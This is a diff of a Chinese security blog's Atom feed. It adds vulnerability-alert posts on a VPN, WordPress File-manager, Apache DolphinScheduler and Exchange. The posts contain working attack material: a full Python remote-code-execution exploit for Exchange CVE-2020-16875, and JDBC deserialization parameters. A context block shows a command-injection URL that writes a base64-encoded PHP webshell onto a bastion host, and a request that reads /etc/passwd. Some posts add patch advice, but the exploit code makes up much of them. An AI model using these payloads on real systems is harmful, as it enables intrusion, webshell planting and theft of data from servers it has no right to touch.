@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://yejinpoxiao.xyz/"/>
-  <updated>2020-09-15T15:50:02.633Z</updated>
+  <updated>2020-09-18T02:28:57.797Z</updated>
   <id>https://yejinpoxiao.xyz/</id>
   
   <author>
@@ -15,6 +15,111 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>深x服某PN存在任意重置绑定手机号漏洞</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-09-18T02:16:37.010Z</published>
+    <updated>2020-09-18T02:28:57.797Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>条件：需要登录</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://url/por/changetelnum.csp?apiversion=1newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;payload&quot;&gt;&lt;a href=&quot;#payload&quot; class=&quot;headerlink&quot; title=&quot;payload&quot;&gt;&lt;/a&gt;payload&lt;/h2&gt;&lt;p&gt;条件：需要登录&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Wordpress File-manager 任意文件上传漏洞</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-09-18T02:02:09.792Z</published>
+    <updated>2020-09-18T02:13:18.858Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="File-Manager-插件介绍"><a href="#File-Manager-插件介绍" class="headerlink" title="File Manager 插件介绍"></a>File Manager 插件介绍</h2><p>WordPress文件管理器插件File Manager 为您提供编辑、删除、上载、下载、复制和粘贴文件和文件夹的功能。您可以轻松地将文件夹或任何文件从一个位置复制，移动到另一个位置。File Manager 插件分为免费版本和收费版本</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>file manager 6.0-6.8</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传phpinfo</p><p><img src="0.png" alt="0"></p><p>访问<a href="http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank" rel="noopener">http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p><p><img src="1.png" alt="1"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;File-Manager-插件介绍&quot;&gt;&lt;a href=&quot;#File-Manager-插件介绍&quot; class=&quot;headerlink&quot; title=&quot;File Manager 插件介绍&quot;&gt;&lt;/a&gt;File Manager 插件介绍&lt;/h2&gt;&lt;p&gt;WordPress文
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>两个Apache DolphinScheduler高危漏洞</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/18/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/18/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/</id>
+    <published>2020-09-18T01:46:10.895Z</published>
+    <updated>2020-09-18T02:02:03.836Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p><h2 id="一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"><a href="#一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）" class="headerlink" title="一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"></a>一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）</h2><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>该漏洞导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache DolphinScheduler    1.2.0</p><p>Apache DolphinScheduler    1.2.1</p><p>Apache DolphinScheduler    1.3.1</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p><p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dolphinscheduler/datasources/connect</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;</span><br><span class="line"></span><br><span class="line">principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;</span><br><span class="line"></span><br><span class="line">other=&#123;"detectCustomCollations":true,"autoDeserialize":true&#125;</span><br></pre></td></tr></table></figure><h2 id="二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"><a href="#二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）" class="headerlink" title="二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"></a>二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）</h2><h3 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h3><p>该漏洞与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc  connect参数输入{“detectCustomCollations”:true,”autoDeserialize”:true}在DolphinScheduler 服务器上远程执行代码。</p><h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache DolphinScheduler  1.2.0</p><p>Apache DolphinScheduler  1.2.1</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>尽快升级版本至1.3.2进行防护，官方下载链接：</p><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html" target="_blank" rel="noopener">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Exchange Server 远程代码执行漏洞(CVE-2020-16875)</title>
+    <link href="https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/"/>
+    <id>https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/</id>
+    <published>2020-09-18T01:31:22.608Z</published>
+    <updated>2020-09-18T02:34:27.862Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>microsoft:exchange_server_2016: cu16/cu17</p><p>microsoft:exchange_server_2019: cu5/cu6</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(str_len=<span class="number">8</span>)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(str_len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0"&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;"""</span> % c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span><span class="params">(t, s, vs, cmd)</span>:</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$senderBtn'</span>: (<span class="literal">None</span>, <span class="string">"ResultPanePlaceHolder_ButtonsPanel_btnNext"</span>),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$name'</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl'</span>: (<span class="string">"dlprce.xml"</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">"(-) failed to trigger rce!"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span><span class="params">(t, s)</span>:</span></span><br><span class="line">    r = s.get(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, verify=<span class="literal">False</span>)</span><br><span class="line">    match = re.search(<span class="string">"&lt;input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" /&gt;"</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the __viewstate!"</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span><span class="params">(t, usr, pwd)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">"destination"</span> : <span class="string">"https://%s/owa"</span> % t,</span><br><span class="line">        <span class="string">"flags"</span> : <span class="string">""</span>,</span><br><span class="line">        <span class="string">"username"</span> : usr,</span><br><span class="line">        <span class="string">"password"</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">"https://%s/owa/auth.owa"</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">'X-OWA-CANARY'</span>) != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the csrf canary!"</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(t, usr, pwd, cmd)</span>:</span></span><br><span class="line">    s = log_in(t, usr, pwd)</span><br><span class="line">    print(<span class="string">"(+) logged in as %s"</span> % usr)</span><br><span class="line">    vs = leak_viewstate(t, s)</span><br><span class="line">    print(<span class="string">"(+) found the __viewstate: %s"</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    print(<span class="string">"(+) executed %s as SYSTEM!"</span> % cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">"(+) eg: %s 192.168.1.1 user123:123456 calc"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">":"</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">"(-) you need a user and password!"</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>补丁：<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;详情&quot;&gt;&lt;a href=&quot;#详情&quot; class=&quot;headerlink&quot; title=&quot;详情&quot;&gt;&lt;/a&gt;详情&lt;/h2&gt;&lt;p&gt;由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>NetLogon特权提升漏洞(CVE-2020-1472)</title>
@@ -99,7 +204,7 @@
     <link href="https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
     <id>https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
     <published>2020-09-12T17:35:26.051Z</published>
-    <updated>2020-09-12T18:06:38.972Z</updated>
+    <updated>2020-09-18T02:02:26.660Z</updated>
     
     <content type="html"><![CDATA[<h2 id="PAN-OS远程代码执行漏洞（CVE-2020-2040）"><a href="#PAN-OS远程代码执行漏洞（CVE-2020-2040）" class="headerlink" title="PAN-OS远程代码执行漏洞（CVE-2020-2040）"></a>PAN-OS远程代码执行漏洞（CVE-2020-2040）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。</p><p>该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor  Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南：</p><p><a href="https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html" target="_blank" rel="noopener">https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html</a></p><h2 id="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>无需登录</p><p>利用过程:</p><p>　　第一，<a href="http://10.20.10.11/listener/cluster_manage.php返回“OK”。" target="_blank" rel="noopener">http://10.20.10.11/listener/cluster_manage.php返回“OK”。</a></p><p>　　第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　$node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　$node_id = @intval($req_node_id);</span><br></pre></td></tr></table></figure><h2 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>　　该漏洞几乎影响2018-2019全版本。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将相应包中的id提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/fileNoLogin/xxxxxxxxxx</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本。</p><h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本</p>]]></content>
     
@@ -362,7 +467,7 @@
     <link href="https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/"/>
     <id>https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/</id>
     <published>2020-06-22T03:14:28.288Z</published>
-    <updated>2020-06-22T03:22:20.940Z</updated>
+    <updated>2020-09-18T01:46:34.875Z</updated>
     
     <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>Windows Background Intelligent Transfer Service 权限提升漏洞</strong></p><p>当Windows Background Intelligent Transfer Service  (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p>]]></content>
     
@@ -433,113 +538,6 @@
     
     
       <category term="提权" scheme="https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>pipePotato-新型通用提权</title>
-    <link href="https://yejinpoxiao.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/"/>
-    <id>https://yejinpoxiao.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/</id>
-    <published>2020-05-08T02:35:08.963Z</published>
-    <updated>2020-06-04T07:20:32.731Z</updated>
-    
